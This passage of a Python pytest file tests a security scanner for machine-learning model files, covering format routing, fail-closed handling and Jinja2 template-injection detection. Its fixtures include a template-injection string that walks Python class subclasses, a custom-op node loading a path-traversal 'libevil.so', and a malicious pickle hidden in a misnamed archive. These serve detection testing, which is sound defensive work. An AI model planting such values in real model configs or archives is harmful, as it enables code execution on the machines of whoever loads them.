    aggregate = scan_model_directory_or_file(str(generic_payload), cache_enabled=False)

    assert result.scanner_name == "tf_metagraph"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_route_incidental_onnx_pb_string(tmp_path: Path) -> None:
    near_match = tmp_path / "metadata.pb"
    near_match.write_bytes(bytes([0x0A, 0x04]) + b"onnx" + b"\x00" * 16)

    result = scan_file(str(near_match))

    assert result.scanner_name != "onnx"
    assert not any(check.name == "Python Operator Detection" for check in result.checks)


def test_scan_file_fails_closed_when_recognized_format_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unavailable_onnx = tmp_path / "model.onnx"
    unavailable_onnx.write_bytes(b"recognized-format")

    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(unavailable_onnx))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]

    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.severity == IssueSeverity.INFO
    assert "Recognized format could not be scanned" in check.message
    assert check.details["format"] == "onnx"
    assert check.details["preferred_scanner_id"] == "onnx"

    aggregate = core_module.scan_model_directory_or_file(str(unavailable_onnx))
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_fail_closed_for_extension_only_recognized_format(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    generic_pb = tmp_path / "metadata.pb"
    generic_pb.write_bytes(b"plain protobuf-ish bytes")

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(generic_pb))

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(check.name == "Format Detection" for check in result.checks)


def test_scan_file_unavailable_recognized_format_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unavailable_onnx = tmp_path / "model.onnx"
    unavailable_onnx.write_bytes(b"recognized-format")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    reset_cache_manager()
    try:
        first = scan_file(str(unavailable_onnx), config=config)
        second = scan_file(str(unavailable_onnx), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
    ambiguous_xml = tmp_path / "payload.txt"
    ambiguous_xml.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )

    result = scan_file(str(ambiguous_xml), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "xml_model_routing_incomplete"
    check = next(check for check in result.checks if check.name == "XML Model Routing")
    assert "bounded probe ended before the first structural root element" in check.message


def test_scan_file_incomplete_xml_routing_result_is_not_cached(tmp_path: Path) -> None:
    ambiguous_xml = tmp_path / "payload.txt"
    ambiguous_xml.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(ambiguous_xml), config=config)
        second = scan_file(str(ambiguous_xml), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_inconclusive_safetensors_header_limit_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = tmp_path / "oversized.safetensors"
    _write_sparse_oversized_safetensors_candidate(payload, header_len=(1024 * 1024) + 1)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        "max_safetensors_header_bytes": 1024 * 1024,
    }
    monkeypatch.setattr(
        safetensors_scanner.SafeTensorsScanner,
        "calculate_file_hashes",
        lambda _self, _path: pytest.fail("inconclusive SafeTensors scans must bypass scanner hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file",
        lambda _self, _path: pytest.fail("bounded SafeTensors failures must bypass cache-key hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file_with_stat",
        lambda _self, _path, _stat: pytest.fail("bounded SafeTensors failures must bypass cache validation hashing"),
    )

    reset_cache_manager()
    try:
        first = scan_file(str(payload), config=config)
        second = scan_file(str(payload), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_ignores_benign_onnx_token_near_match(tmp_path: Path) -> None:
    near_match = tmp_path / "note.payload"
    near_match.write_bytes(b"this documentation mentions onnx but is not a model")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_misnamed_numpy_by_header(tmp_path: Path) -> None:
    np = pytest.importorskip("numpy")

    disguised_numpy = tmp_path / "weights.payload"
    with disguised_numpy.open("wb") as handle:
        np.save(handle, np.array([1, 2, 3], dtype=np.float32), allow_pickle=False)

    result = scan_file(str(disguised_numpy))

    assert result.scanner_name == "numpy"


def test_scan_file_routes_misnamed_sevenzip_by_header(tmp_path: Path) -> None:
    py7zr = pytest.importorskip("py7zr")

    disguised_7z = tmp_path / "archive.jpg"
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(_build_malicious_pickle())

    with py7zr.SevenZipFile(disguised_7z, "w") as archive:
        archive.write(payload, arcname="payload.pkl")

    result = scan_file(str(disguised_7z))

    assert result.scanner_name == "sevenzip"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_fails_closed_on_rar_archive(tmp_path: Path) -> None:
    rar_path = tmp_path / "archive.rar"
    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)

    result = scan_file(str(rar_path), config={"cache_scan_results": False})

    assert result.scanner_name == "rar"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "rar_archive_unsupported" in result.metadata["scan_outcome_reasons"]
    rar_check = next(check for check in result.checks if check.name == "RAR Archive Support")
    assert rar_check.severity == IssueSeverity.INFO
    assert "RAR archive contents were not scanned" in rar_check.message


def test_scan_file_does_not_fail_closed_on_rar_suffix_near_match(tmp_path: Path) -> None:
    rar_path = tmp_path / "not_really.rar"
    rar_path.write_text("plain text, not a RAR archive\n", encoding="utf-8")

    result = scan_file(str(rar_path), config={"cache_scan_results": False})

    assert result.scanner_name != "rar"
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(check.name == "RAR Archive Support" for check in result.checks)


def test_scan_file_rar_inconclusive_result_is_not_cached(tmp_path: Path) -> None:
    rar_path = tmp_path / "archive.rar"
    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(rar_path), config=config)
        second = scan_file(str(rar_path), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_routes_readme_documentation_to_metadata_scanner(tmp_path: Path) -> None:
    readme_path = tmp_path / "README.md"
    readme_path.write_text("# Model Card\n\nThis README is benign.\n")

    result = scan_file(str(readme_path), config={"cache_scan_results": False})

    assert result.scanner_name == "metadata"
    assert result.success is True


@pytest.mark.parametrize("leading_line", ["tree model notes", "tree=implementation notes"])
def test_scan_file_keeps_tree_prefixed_readme_on_metadata_scanner(tmp_path: Path, leading_line: str) -> None:
    readme_path = tmp_path / "README.md"
    readme_path.write_text(
        f"{leading_line}\n"
        "tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
        "tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
        f"API Key: sk-{'A' * 48}\n",
        encoding="utf-8",
    )

    result = scan_file(str(readme_path), config={"cache_scan_results": False})

    assert result.scanner_name == "metadata"
    assert any(issue.severity == IssueSeverity.INFO for issue in result.issues)


def test_scan_file_routes_model_config_json_to_manifest_scanner(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "bert",
                "architectures": ["BertModel"],
                "hidden_size": 768,
            }
        )
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert result.success is True


def test_directory_child_probe_stops_at_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    def bounded_iterdir(self: Path) -> Iterator[Path]:
        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT):
            yield self / f"child_{index}"
        raise AssertionError("directory child probe consumed past its limit")

    monkeypatch.setattr(Path, "iterdir", bounded_iterdir)

    assert (
        core_module._count_immediate_children_up_to(
            tmp_path,
            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
        )
        == core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT
    )


def test_directory_file_probe_stops_after_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    def bounded_rglob(self: Path, pattern: str) -> Iterator[Path]:
        assert pattern == "*"
        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT + 1):
            child = self / f"child_{index}.pkl"
            child.touch()
            yield child
        raise AssertionError("directory file probe consumed past its limit")

    monkeypatch.setattr(Path, "rglob", bounded_rglob)

    assert (
        core_module._count_files_up_to(
            tmp_path,
            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
        )
        is None
    )


def test_scan_directory_without_progress_skips_file_counting(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "model.pkl"
    model_path.write_bytes(b"\x80\x04N.")

    def fail_rglob(self: Path, pattern: str) -> Iterator[Path]:
        raise AssertionError(f"unexpected rglob({pattern!r}) for {self}")

    monkeypatch.setattr(Path, "rglob", fail_rglob)

    result = scan_model_directory_or_file(
        str(tmp_path),
        cache_scan_results=False,
    )

    assert result.files_scanned == 1


def test_scan_file_routes_manifest_owned_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "llama",
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        )
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_mxnet_shaped_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "llama",
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_mxnet_shaped_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(
        str(manifest_path),
        config={"scanners": ["mxnet", "manifest"], "cache_scan_results": False},
    )

    assert result.scanner_name == "mxnet"
    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_scan_file_mxnet_shaped_tokenizer_config_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    tokenizer_path = tmp_path / "tokenizer_config.json"
    tokenizer_path.write_text(
        json.dumps(
            {
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_mxnet_routed_tokenizer_duplicate_override_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    tokenizer_path = tmp_path / "tokenizer_config.json"
    tokenizer_path.write_text(
        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_file(
        str(tokenizer_path),
        config={"scanners": ["mxnet", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.scanner_name == "mxnet"
    assert "mxnet_symbol_invalid_structure" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_xgboost_shaped_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_xgboost_shaped_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(
        str(manifest_path),
        config={"scanners": ["xgboost", "manifest"], "cache_scan_results": False},
    )

    assert result.scanner_name == "xgboost"
    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_scan_file_xgboost_shaped_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    template_path = tmp_path / "chat_template.json"
    template_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(template_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_malformed_xgboost_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    template_path = tmp_path / "chat_template.json"
    template_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",',
        encoding="utf-8",
    )

    result = scan_file(
        str(template_path),
        config={"scanners": ["xgboost", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.scanner_name == "xgboost"
    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_xgboost_generation_config_runs_selected_jinja_when_manifest_excluded(tmp_path: Path) -> None:
    generation_path = tmp_path / "generation_config.json"
    generation_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(
        str(generation_path),
        config={"scanners": ["xgboost", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.scanner_name == "xgboost"
    assert "manifest" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
